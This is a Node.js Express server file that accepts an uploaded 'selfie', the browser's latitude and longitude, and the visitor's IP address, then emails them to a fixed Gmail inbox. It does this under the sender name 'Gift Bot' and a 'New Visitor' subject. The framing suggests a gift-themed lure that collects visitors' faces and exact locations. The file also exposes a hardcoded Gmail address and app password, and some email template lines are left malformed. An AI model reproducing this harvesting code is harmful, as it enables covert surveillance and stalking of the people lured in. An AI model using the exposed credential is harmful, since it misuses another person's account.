const express = require("express");
const nodemailer = require("nodemailer");
const multer = require("multer");
const path = require("path");
const fs = require("fs");
const fetch = require("node-fetch"); // ✅ for IP-based location

const app = express();
const PORT = process.env.PORT || 3000;

const upload = multer({ dest: "uploads/" });

// ✅ Allow parsing form fields
app.use(express.urlencoded({ extended: true }));

app.get("/", (req, res) => {
  res.send("✅ Email server is up and running.");
});

app.post("/send-email", upload.single("image"), async (req, res) => {
  try {
    const imagePath = req.file.path;
    const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;

    // ✅ Get location from IP
    // let locationData = {};
    // try {
    //   const response = await fetch(`https://ipapi.co/${ip}/json/`);
    //   locationData = await response.json();
    // } catch (err) {
    //   console.error("❌ Location fetch from IP failed:", err);
    // }

    // ✅ Get lat/lon from form (browser location)
    const browserLat = req.body.latitude || "N/A";
    const browserLon = req.body.longitude || "N/A";

    // ✅ Final email content
    const emailBody = `
🧍 User Selfie Submission

🌐 IP-Based Location:
IP Address: ${ip}
City: "N/A"}
Region: "N/A"}
Country: "N/A"}
Postal: "N/A"}
ISP: "N/A"}

📍 Browser-Based Location:
Latitude: ${browserLat}
Longitude: ${browserLon}
Google Maps: https://www.google.com/maps?q=${browserLat},${browserLon}
`;

    // ✅ Mail config
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: "adityadrools@gmail.com",
        pass: "jxqvmogganjsycpm",
      },
    });

    const mailOptions = {
      from: '"Gift Bot" <adityadrools@gmail.com>',
      to: "adityadrools@gmail.com",
      subject: "🎁 New Visitor - Selfie, Location, IP",
      text: emailBody,
      attachments: [
        {
          filename: "selfie.jpg",
          path: imagePath,
        },
      ],
    };

    await transporter.sendMail(mailOptions);
    console.log("✅ Email sent with selfie + full location");

    fs.unlinkSync(imagePath);
    res.status(200).send("✅ Sent email with selfie + location");

  } catch (error) {
    console.error("❌ Failed to send email:", error);
    res.status(500).send("Failed to send email");
  }
});

app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
